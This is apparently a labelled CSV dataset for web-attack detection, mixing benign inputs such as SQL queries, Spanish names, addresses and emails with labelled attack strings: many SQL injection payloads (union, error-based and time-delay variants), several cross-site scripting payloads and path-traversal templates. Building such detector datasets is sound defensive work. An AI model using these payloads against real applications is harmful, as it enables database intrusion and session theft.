payload,attack_type,is_attack,source
SELECT * FROM person FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM frog,norm,0,SQLiV3
" SELECT * FROM public ORDER BY rising ASC, foot DESC",norm,0,SQLiV3
ne-regio,norm,0,HttpParamsDataset
//../../../../../../..{file},path-traversal,1,HttpParamsDataset
"1'  )   as wnyl where 8978  =  8978 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli,1,SQLiV3
"1'||(select 'oxam' from dual where 7162=7162 and make_set(8403=8403,8899))||'",sqli,1,HttpParamsDataset
SELECT * FROM list WHERE tin = 'toy',norm,0,SQLiV3
aldea de san miguel,norm,0,HttpParamsDataset
1' where 9416  =  9416,sqli,1,SQLiV3
SELECT * FROM made WHERE group = 'crop' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
"<img """"""><script>alert(""xss"")</script>"">",xss,1,HttpParamsDataset
">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss,1,HttpParamsDataset
1a49e6o301,norm,0,HttpParamsDataset
"  SELECT rocky AS compound, chosen AS [lady]  FROM key",norm,0,SQLiV3
chimenea,norm,0,HttpParamsDataset
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,sqli,1,SQLiV3
"pasaje arquitecto gaudi 85,",norm,0,HttpParamsDataset
SELECT * FROM sudden  WHERE industrial = bigger,norm,0,SQLiV3
69409914p,norm,0,HttpParamsDataset
"1""  )   where 9570  =  9570 rlike   (  select   (  case when   (  1642  =  3686  )   then 1 else 0x28 end   )    )   --",sqli,1,SQLiV3
" SELECT * FROM eat ORDER BY copper, dot",norm,0,SQLiV3
"1"") as uuth where 8555=8555 union all select null,null#",sqli,1,HttpParamsDataset
"eduardo alvarez, 28",norm,0,HttpParamsDataset
"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sqli,1,SQLiV3
1 where 7802  =  7802,sqli,1,SQLiV3
6432,norm,0,HttpParamsDataset
l0s4njear,norm,0,HttpParamsDataset
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1,HttpParamsDataset
1'   )    )    waitfor delay '0:0:5' and    (    (   'jcfe'  =  'jcfe,sqli,1,SQLiV3
leiro,norm,0,HttpParamsDataset
-2817) where 1212=1212 or 3266=1102,sqli,1,HttpParamsDataset
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",sqli,1,SQLiV3
FROM  ( SELECT DISTINCT wood FROM roof ) ,norm,0,SQLiV3
hao,norm,0,HttpParamsDataset
SELECT TOP 3 * FROM crop WHERE further = 'minerals' SELECT * FROM involved,norm,0,SQLiV3
1'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,HttpParamsDataset
-4904') as ogyu where 2821=2821 or 5982=1643,sqli,1,HttpParamsDataset
"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",sqli,1,SQLiV3
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",sqli,1,SQLiV3
"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",sqli,1,SQLiV3
zackaria8,norm,0,HttpParamsDataset
/.../{file},path-traversal,1,HttpParamsDataset
SELECT * FROM brass WHERE activity = 'closely'  AND City = 'willing',norm,0,SQLiV3
SELECT COUNT ( DISTINCT sound )  FROM serious,norm,0,SQLiV3
0765386023011242,norm,0,HttpParamsDataset
84166910c,norm,0,HttpParamsDataset
vies canales,norm,0,HttpParamsDataset
DELETE FROM zulu,norm,0,SQLiV3
trixie,norm,0,HttpParamsDataset
7136610000000000,norm,0,SQLiV3
"-7743"" or 9323  =  9323#",sqli,1,SQLiV3
r393lin3nte,norm,0,HttpParamsDataset
1  )   and 3659  =  5475 and   (  8949  =  8949,sqli,1,SQLiV3
SELECT * FROM atmosphere WHERE mountain = 'slept',norm,0,SQLiV3
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('raus'='raus",sqli,1,HttpParamsDataset
"1"" and elt(8464=5761,5761) and ""ydmt"" like ""ydmt",sqli,1,HttpParamsDataset
"1%"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",sqli,1,HttpParamsDataset
francois,norm,0,HttpParamsDataset
84996241v,norm,0,HttpParamsDataset
"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ",sqli,1,SQLiV3
SELECT COUNT ( die )  FROM syllable,norm,0,SQLiV3
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",sqli,1,SQLiV3
6267,norm,0,HttpParamsDataset
"-2226%"")) union all select 1018,1018,1018,1018--",sqli,1,HttpParamsDataset
"1%"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""%""=""",sqli,1,HttpParamsDataset
"-4381 or make_set(6118=3095,3095)# lkcr",sqli,1,HttpParamsDataset
19332,norm,0,HttpParamsDataset
"   SELECT please,black,apart,leader,conversation     (  (  wonder JOIN beginning ON angle.zebra =  cattle.chicken )   INNER JOIN objectON Orders.office =  natural.haveID ) ",norm,0,SQLiV3
mitjans,norm,0,HttpParamsDataset
"1' in boolean mode) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)#",sqli,1,HttpParamsDataset
"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sqli,1,SQLiV3
SELECT * FROM division,norm,0,SQLiV3
21210077y,norm,0,HttpParamsDataset
"<layer src=""http://vulnerability-lab.com/script.html""></layer>",xss,1,HttpParamsDataset
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",sqli,1,SQLiV3
shazmnn,norm,0,HttpParamsDataset
SELECT * FROM  ( SELECT operation FROM win ) ,norm,0,SQLiV3
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",sqli,1,HttpParamsDataset
dominguez@comercioenlacalle.hn,norm,0,HttpParamsDataset
37156228g,norm,0,HttpParamsDataset
loganiceo,norm,0,HttpParamsDataset
26325,norm,0,HttpParamsDataset
"1%"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,HttpParamsDataset
bruna,norm,0,HttpParamsDataset
"1%"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,HttpParamsDataset
karyl,norm,0,HttpParamsDataset
43812,norm,0,HttpParamsDataset
">""<script>document.cookie=true;//--></script>",xss,1,HttpParamsDataset
SELECT * FROM zebra WHERE gulf BETWEEN 'represent' AND 'additional',norm,0,SQLiV3
SELECT went ( s )  FROM using LEFT JOIN,norm,0,SQLiV3
/../..//../..//../{file},path-traversal,1,HttpParamsDataset
"1%""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,sqli,1,SQLiV3
knute,norm,0,HttpParamsDataset
1%'  )   and 9198  =  9198--,sqli,1,SQLiV3
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('dreq'='dreq",sqli,1,HttpParamsDataset
koock@aridossanchez.mt,norm,0,HttpParamsDataset
"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",sqli,1,SQLiV3
"1""   )    )    as hzcq where 9250  =  9250 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",sqli,1,SQLiV3
san vicente de la barquera,norm,0,HttpParamsDataset
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not',norm,0,SQLiV3
brind.am,norm,0,HttpParamsDataset
SELECT COUNT ( DISTINCT command )  FROM return,norm,0,SQLiV3
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",sqli,1,SQLiV3
<script>alert(/xss/.source)</script>,xss,1,HttpParamsDataset
SELECT * FROM essential WHERE Price NOT BETWEEN 10 AND 20,norm,0,SQLiV3
montroy,norm,0,HttpParamsDataset
50332,norm,0,HttpParamsDataset
5229,norm,0,SQLiV3
6986967316168670,norm,0,HttpParamsDataset
pravia,norm,0,HttpParamsDataset
osteicoechea uslet,norm,0,HttpParamsDataset
"  SELECT * FROM setting WHERE struck IN  ( 'drink', 'giving', 'temperature' )  ",norm,0,SQLiV3
9.32767E+015,norm,0,SQLiV3
alfi,norm,0,HttpParamsDataset
escudero ostria,norm,0,HttpParamsDataset
branchadell arribas,norm,0,HttpParamsDataset
8025250000000000,norm,0,SQLiV3
SELECT COUNT ( surfaceID ) FROM mine,norm,0,SQLiV3
 UPDATE single SET view = 'at'WHERE huge = 'made',norm,0,SQLiV3
5568407559303725,norm,0,HttpParamsDataset
rabascall,norm,0,HttpParamsDataset
byrska@diagnosticoradiologico.nz,norm,0,HttpParamsDataset
otorgamiento,norm,0,HttpParamsDataset
"-3805""))) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",sqli,1,HttpParamsDataset
SELECT hundred ( s )  FROM sort LEFT JOIN,norm,0,SQLiV3
32845189q,norm,0,HttpParamsDataset
"  SELECT scientist,film,experiment FROM bone LEFT JOIN Orders ON stretch.mailID =  least.brass ORDER BY shoot.hurried",norm,0,SQLiV3
SELECT TOP 3 * FROM wooden SELECT * FROM moving 3SELECT * FROM wonderful,norm,0,SQLiV3
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",sqli,1,SQLiV3
"1%""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,HttpParamsDataset
SELECT TOP 3 * FROM determine,norm,0,SQLiV3
"-8600"" or elt(1032=1032,3623) and ""kfsn"" like ""kfsn",sqli,1,HttpParamsDataset
burguillos de toledo,norm,0,HttpParamsDataset
alcantud,norm,0,HttpParamsDataset
60996626m,norm,0,HttpParamsDataset
SELECT * FROM stretch WHERE cast BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
43232451h,norm,0,HttpParamsDataset
alegre nomdedeu,norm,0,HttpParamsDataset
SELECT nature ( s FROM yesterday RIGHT JOIN,norm,0,SQLiV3
"1%' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",sqli,1,SQLiV3
SELECT potatoes ( s )  FROM search LEFT JOIN,norm,0,SQLiV3
1   )    )    as pxmz where 2596  =  2596,sqli,1,SQLiV3
serret@sierradealcaraz.dj,norm,0,HttpParamsDataset
concluir,norm,0,HttpParamsDataset
"1 where 8333=8333 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,HttpParamsDataset
"1""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli,1,SQLiV3
"   SELECT hot, sometime, bareFROM earn WHERE touch  IS NOT NULL",norm,0,SQLiV3
seymour@evelin.gn,norm,0,HttpParamsDataset
SELECT MIN ( cheese )  AS correctly FROM store,norm,0,SQLiV3
rode@sayuela.kw,norm,0,HttpParamsDataset
llaveria magnieto,norm,0,HttpParamsDataset
1') as yyyb where 1705=1705 and (8770=6988)*6988--,sqli,1,HttpParamsDataset
alidia,norm,0,HttpParamsDataset
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2868  =  2868",sqli,1,SQLiV3
"c/ norte 9,",norm,0,HttpParamsDataset
"1' where 3339=3339 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,HttpParamsDataset
segovia,norm,0,HttpParamsDataset
holbrook,norm,0,HttpParamsDataset
conmi5u52,norm,0,HttpParamsDataset
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""bmbg"" like ""bmbg",sqli,1,HttpParamsDataset
1'+  (  select 'jaok' where 2592  =  2592,sqli,1,SQLiV3
62123000t,norm,0,HttpParamsDataset
assassn clrici,norm,0,HttpParamsDataset
"  SELECT tired,zero,symbol FROM left LEFT JOIN Orders ON position.elephantID =  fairly.pink ORDER BY tropical.gas",norm,0,SQLiV3
29400,norm,0,HttpParamsDataset
"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli,1,SQLiV3
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,norm,0,SQLiV3
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sqli,1,SQLiV3
SELECT AVG ( mixture )  FROM raw  SELECT SUM ( pattern ) ,norm,0,SQLiV3
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",sqli,1,HttpParamsDataset
SELECT * FROM tip  WHERE onto NOT LIKE '[table]%',norm,0,SQLiV3
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,sqli,1,SQLiV3
"partida lliriet d'en mig, 135, 10?a",norm,0,HttpParamsDataset
"1"" where 2131=2131 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,HttpParamsDataset
2368,norm,0,HttpParamsDataset
tie3t54,norm,0,HttpParamsDataset
1 and 2006=2006,sqli,1,HttpParamsDataset
SELECT * FROM swim  WHERE original = job,norm,0,SQLiV3
"1"";if(7899=7899) select 7899 else drop function zbbp--",sqli,1,HttpParamsDataset
core,norm,0,HttpParamsDataset
"1 where 1326  =  1326 union all select null,null,null,null,null,null--",sqli,1,SQLiV3
calle juan valera 97 12d,norm,0,HttpParamsDataset
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",sqli,1,SQLiV3
DELETE FROM satellites,norm,0,SQLiV3
2532460000000000,norm,0,SQLiV3
